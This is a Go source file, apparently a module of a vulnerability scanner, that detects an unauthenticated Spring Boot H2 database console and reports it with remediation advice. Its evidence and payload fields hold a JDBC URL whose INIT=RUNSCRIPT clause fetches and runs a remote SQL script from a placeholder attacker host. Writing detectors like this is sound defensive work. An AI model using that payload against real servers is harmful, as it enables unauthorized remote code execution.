package web

// H2 Console RCE: Spring Boot enables H2 in-memory database web console by default in dev mode
// If exposed without auth: allows arbitrary SQL execution → system command execution via INIT script

import (
	"context"
	"fmt"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&H2ConsoleRCE{}) }

type H2ConsoleRCE struct{}

func (m *H2ConsoleRCE) ID() string          { return "h2-console-rce" }
func (m *H2ConsoleRCE) Name() string        { return "H2 Console Exposed + RCE via INIT Script" }
func (m *H2ConsoleRCE) CVSS() float64       { return 9.8 }
func (m *H2ConsoleRCE) Severity() models.Severity { return models.SeverityCritical }
func (m *H2ConsoleRCE) Tags() []string      { return []string{"rce", "h2", "database", "spring-boot", "console"} }
func (m *H2ConsoleRCE) Requirements() vulns.ModuleRequirements { return vulns.ModuleRequirements{} }
func (m *H2ConsoleRCE) Description() string {
	return "Spring Boot's H2 web console is exposed without authentication. Connecting with a JDBC URL containing an INIT script allows arbitrary Java code execution."
}

var h2Paths = []string{"h2-console", "h2-console/", "console"}

func (m *H2ConsoleRCE) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	for _, p := range h2Paths {
		resp, err := client.Get(ctx, utils.JoinURL(target.BaseURL, p), nil)
		if err != nil || resp.StatusCode != 200 {
			continue
		}
		if !strings.Contains(resp.BodyString, "H2 Console") &&
			!strings.Contains(resp.BodyString, "h2console") &&
			!strings.Contains(resp.BodyString, "org.h2") {
			continue
		}

		f := &models.Finding{
			ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
			Type:        models.FindingTypeVuln,
			Severity:    m.Severity(),
			CVSS:        m.CVSS(),
			Title:       "H2 Database Console Exposed — Unauthenticated RCE Possible",
			Description: m.Description(),
			URL:         target.BaseURL,
			Endpoint:    "/" + p,
			Method:      "GET",
			Evidence:    fmt.Sprintf("H2 console accessible at /%s — connect with JDBC URL: jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker/rce.sql'", p),
			Payload:     "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker/rce.sql'",
			Remediation: "Set spring.h2.console.enabled=false in production. Add spring.h2.console.settings.web-allow-others=false. Restrict to localhost only.",
			References:  []string{"https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html"},
			Tags:        m.Tags(),
			Timestamp:   time.Now(),
			ModuleID:    m.ID(),
		}
		return []*models.Finding{f}, nil
	}
	return nil, nil
}

func (m *H2ConsoleRCE) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.Check(ctx, target, client)
}
